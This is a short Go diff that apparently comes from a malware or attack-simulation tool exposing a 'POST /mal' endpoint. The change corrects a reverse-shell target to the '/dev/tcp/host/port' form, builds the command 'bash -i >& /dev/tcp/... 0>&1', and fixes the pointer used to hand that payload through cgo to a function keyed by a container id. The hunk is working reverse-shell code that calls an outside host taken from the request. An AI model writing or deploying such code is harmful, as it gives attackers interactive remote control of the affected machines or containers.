@@ -96,11 +96,11 @@ func main() {
 			//	logrus.Errorf("[main] - [POST /mal] - 启动shell进程失败: %v", err)
 			//	return
 			//}
-			target := fmt.Sprintf("%s:%d", req.Host, req.Port)
+			target := fmt.Sprintf("%s/%d", req.Host, req.Port)
 			cmdBytes := []byte("bash -i >& /dev/tcp/" + target + " 0>&1")
 			cmdStr := string(cmdBytes)
 
-			cptr := (*C.uint8_t)(unsafe.Pointer(&cmdBytes))
+			cptr := (*C.uint8_t)(unsafe.Pointer(&cmdBytes[0]))
 			clen := C.size_t(len(cmdBytes))
 			ctidParam := C.uint64_t(uint64(ctidInt))
 			C.tell_pin_ctid(cptr, clen, ctidParam)
